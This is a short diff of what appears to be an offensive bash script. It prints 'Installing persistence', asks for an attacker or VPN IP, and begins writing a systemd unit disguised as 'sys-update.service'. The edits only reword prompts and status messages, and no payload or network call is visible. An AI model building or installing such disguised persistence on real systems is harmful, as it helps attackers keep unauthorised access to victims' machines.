@@ -17,7 +17,7 @@ clear
 echo "[💀] Installing persistence..."
 
 
-read -p "YOUR IP: " IP
+read -p "Your VPN IP: " IP
 
 sleep 1
 
@@ -74,7 +74,7 @@ sleep 1
 #        SYSTEMD SERVICE       #
 ################################
 
-echo "[+] creating systemd persistence"
+echo "[+] creating systemd service"
 
 cat <<EOF > /etc/systemd/system/sys-update.service
 [Unit]
